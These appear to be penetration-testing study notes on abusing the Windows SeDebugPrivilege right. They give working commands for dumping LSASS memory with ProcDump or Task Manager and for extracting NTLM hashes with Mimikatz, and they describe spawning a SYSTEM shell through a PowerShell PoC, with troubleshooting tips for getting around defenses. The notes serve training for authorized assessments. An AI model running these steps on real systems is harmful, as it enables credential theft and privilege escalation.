## Overview

`SeDebugPrivilege` is the Windows **Debug programs** user right.

It may be assigned to a user instead of adding that user to the local Administrators group when they need to run or troubleshoot specific applications or services.

By default, this privilege is normally granted only to administrators because it can allow access to sensitive operating system components, process memory, kernel structures, and application internals.

> [!warning]
> `SeDebugPrivilege` should be assigned sparingly. During an assessment, any user with this privilege should be treated as potentially high-impact even if they are not a local administrator.

---

# Why SeDebugPrivilege Matters

A user may not be a local admin on a host but may still have powerful rights that are not obvious through remote enumeration.

This matters during internal penetration tests because:

- users with this privilege may be able to access sensitive process memory
- LSASS memory may contain credential material
- successful dumping of LSASS may expose NTLM hashes
- NTLM hashes may support lateral movement if reused across systems
- the privilege may also be abused to spawn a process as `NT AUTHORITY\SYSTEM`

---

# Common Discovery Context

During internal testing, OSINT sources such as LinkedIn may help identify high-value target users.

Developers are especially worth checking because they may be assigned privileges such as `SeDebugPrivilege` for debugging system components.

This can be useful when:

- credentials have been captured with tools like `Responder` or `Inveigh`
- multiple user credentials are available
- RDP access exists to one or more systems
- BloodHound or remote enumeration does not reveal the privilege
- the user is not a local administrator but may still have dangerous local rights

---

# User Right Location

`SeDebugPrivilege` can be assigned through local or domain Group Policy.

```text
Computer Settings > Windows Settings > Security Settings
```

The relevant user right is:

```text
Debug programs
```

---

# Check Assigned Privileges

After logging in as a user with the `Debug programs` right, open an elevated shell and check privileges.

```cmd
whoami /priv
```

Example output:

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

> [!note]
> `SeDebugPrivilege` may appear as `Disabled` in the current token but still be present and usable from an elevated context.

---

# Method 1 – Dump LSASS with ProcDump

## Goal

Use `SeDebugPrivilege` to dump LSASS process memory and extract credential material offline.

LSASS is a useful target because it stores credential-related information after users log on to a Windows system.

---

## Tool

Use `ProcDump` from the Sysinternals suite.

```text
procdump.exe
```

---

## Dump LSASS

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Example output:

```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

### Command breakdown

| Part | Purpose |
|---|---|
| `procdump.exe` | Sysinternals process dump utility |
| `-accepteula` | Accept Sysinternals EULA |
| `-ma` | Create a full memory dump |
| `lsass.exe` | Target process |
| `lsass.dmp` | Output dump file |

---

# Analyze LSASS Dump with Mimikatz

## Recommended Logging

Before running credential extraction commands in `Mimikatz`, start logging.

```cmd
log
```

This writes command output to a `.txt` log file.

> [!tip]
> Logging is useful when dumping credentials from systems that may have many sessions or credentials in memory.

---

## Load the Minidump

```cmd
sekurlsa::minidump lsass.dmp
```

## Extract Logon Passwords / Hashes

```cmd
sekurlsa::logonpasswords
```

Example workflow:

```cmd
C:\htb> mimikatz.exe

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...
```

Example extracted credential material:

```text
Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000

        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
```

---

# Post-Exploitation Use Case

If an NTLM hash is recovered for a local administrator account, it may be useful for lateral movement when the same local administrator password is reused on other systems.

Possible next step:

```text
Pass-the-hash
```

> [!important]
> Reused local administrator credentials are common in large environments and can turn a single LSASS dump into broader lateral movement potential.

---

# Method 2 – Manual LSASS Dump via Task Manager

## When to Use

Use this method when:

- RDP access is available
- tools cannot be uploaded to the target
- ProcDump or similar tools are blocked
- GUI access is easier than command-line dumping

---

## Workflow

1. RDP into the target as the user with `SeDebugPrivilege`.
2. Open Task Manager.
3. Go to the `Details` tab.
4. Locate `lsass.exe`.
5. Right-click `lsass.exe`.
6. Select `Create dump file`.
7. Download the dump file to the attack system.
8. Analyze it with `Mimikatz`.

---

## Analyze Manual Dump

Use the same Mimikatz workflow:

```cmd
mimikatz.exe
```

```cmd
log
```

```cmd
sekurlsa::minidump <dump_file>
```

```cmd
sekurlsa::logonpasswords
```

---

# Method 3 – Remote Code Execution as SYSTEM

## Goal

Use `SeDebugPrivilege` to spawn a child process that inherits or impersonates the token of a parent process running as `NT AUTHORITY\SYSTEM`.

If the targeted parent process is running as SYSTEM, the new process can run as SYSTEM.

---

## Required Conditions

This technique assumes:

- the user has `SeDebugPrivilege`
- an elevated PowerShell console is available
- a suitable SYSTEM process PID can be identified
- the PoC script is available on the target

---

## PoC Script

The notes reference the `psgetsystem` PowerShell PoC.

```text
psgetsys.ps1
```

Usage pattern:

```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

> [!important]
> The third blank argument `""` is required for the referenced PoC syntax.

> [!note]
> The source notes mention that the PoC script has received an update and that the GitHub repository should be reviewed for current usage.

---

# Identify a SYSTEM Process

Open an elevated PowerShell console and list processes.

```powershell
tasklist
```

Example output:

```powershell
PS C:\htb> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

In the example, `winlogon.exe` is running with PID `612` and can be targeted because it runs as SYSTEM.

---

# Spawn a SYSTEM Process

General syntax:

```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

Example structure:

```powershell
[MyProcess]::CreateProcessFromParent(612,"cmd.exe","")
```

Then verify the new shell context:

```cmd
whoami
```

Expected-style result:

```cmd
nt authority\system
```

---

# Faster PID Selection with Get-Process

Instead of manually using `tasklist`, PowerShell can be used to retrieve the PID of a well-known SYSTEM process.

Example target processes mentioned in the notes:

```text
winlogon.exe
lsass.exe
```

Potential workflow:

```powershell
Get-Process winlogon
```

or:

```powershell
Get-Process lsass
```

Then pass the selected PID into the PoC syntax.

---

# Other SeDebugPrivilege PoCs

The notes also mention additional PoCs that can spawn a SYSTEM shell when `SeDebugPrivilege` is available.

This can be useful when:

- RDP is not available
- only a web shell is available
- only command injection is available
- only a reverse shell is available
- LSASS dumping does not produce useful credentials
- SYSTEM-level command execution is more useful than credential extraction

---

# Practical Decision Tree

## Do you have SeDebugPrivilege?

Check:

```cmd
whoami /priv
```

If `SeDebugPrivilege` appears, continue.

---

## Do you have RDP or GUI access?

### Yes

Consider:

- manual LSASS dump through Task Manager
- elevated PowerShell for SYSTEM process spawning

### No

Consider:

- command-line LSASS dumping with ProcDump
- modifying PoCs to execute a command
- modifying PoCs to return a SYSTEM shell
- using the privilege from an existing shell context if possible

---

## Do you need credentials or SYSTEM execution?

### Need credentials

Try dumping LSASS:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Then process with:

```cmd
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Need SYSTEM execution

Identify a SYSTEM process PID:

```powershell
tasklist
```

Then use the PoC pattern:

```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

---

# Troubleshooting

## SeDebugPrivilege does not show up

Possible reasons:

- wrong user context
- non-elevated shell
- privilege not assigned
- Group Policy has not applied
- logged into a host where the right is not granted

---

## SeDebugPrivilege shows as Disabled

This may still be usable from an elevated context.

Try:

- opening an elevated shell
- using the assigned user’s credentials
- checking the privilege again with `whoami /priv`

---

## ProcDump fails

Possible causes:

- endpoint protection blocks ProcDump
- insufficient rights
- LSASS protection features
- wrong architecture or tool version
- write permissions issue in the current directory

Try:

- writing to another directory
- running from an elevated shell
- using manual Task Manager dump if RDP is available
- using another dumping technique authorized for the lab or assessment

---

## Mimikatz does not show useful credentials

Possible reasons:

- no useful users are logged in
- credential material is not present
- LSASS protections are enabled
- the dump was incomplete
- only machine or service-related material is present

Alternative:

- attempt SYSTEM execution using `SeDebugPrivilege`
- look for reusable local admin NTLM hashes
- pivot to another host where more valuable sessions exist

---

## PoC does not spawn SYSTEM shell

Check:

- the PowerShell session is elevated
- the PID belongs to a SYSTEM process
- the third blank argument `""` is included
- the PoC syntax matches the current version
- endpoint protection is not blocking the behavior

---

# Command Reference

## Check privileges

```cmd
whoami /priv
```

## Dump LSASS with ProcDump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

## Start Mimikatz

```cmd
mimikatz.exe
```

## Enable Mimikatz logging

```cmd
log
```

## Load LSASS dump

```cmd
sekurlsa::minidump lsass.dmp
```

## Extract logon passwords / hashes

```cmd
sekurlsa::logonpasswords
```

## List processes

```powershell
tasklist
```

## Get process by name

```powershell
Get-Process winlogon
```

```powershell
Get-Process lsass
```

## Create process from SYSTEM parent process

```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

## Example SYSTEM shell spawn pattern

```powershell
[MyProcess]::CreateProcessFromParent(612,"cmd.exe","")
```

## Verify current user

```cmd
whoami
```

---

# Key Takeaways

- `SeDebugPrivilege` is the Windows **Debug programs** right.
- It may be assigned to non-admin users for troubleshooting or development work.
- Users with this privilege can be high-value internal targets.
- LSASS can be dumped with ProcDump when conditions allow.
- LSASS dumps can be processed offline with Mimikatz.
- Recovered NTLM hashes may support lateral movement if local admin passwords are reused.
- RDP access can allow manual LSASS dumping through Task Manager.
- `SeDebugPrivilege` can also support SYSTEM-level code execution by abusing a SYSTEM parent process.
- If LSASS dumping is not useful, SYSTEM execution may still provide a viable escalation path.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[LSASS]]
- [[Mimikatz]]
- [[ProcDump]]
- [[Pass-the-Hash]]
- [[Token Impersonation]]
- [[Windows User Rights Assignment]]

---

# Tags

#windows
#privilege-escalation
#sedebugprivilege
#debug-programs
#lsass
#mimikatz
#procdump
#credential-dumping
#pass-the-hash
#token-impersonation
#system
#pentesting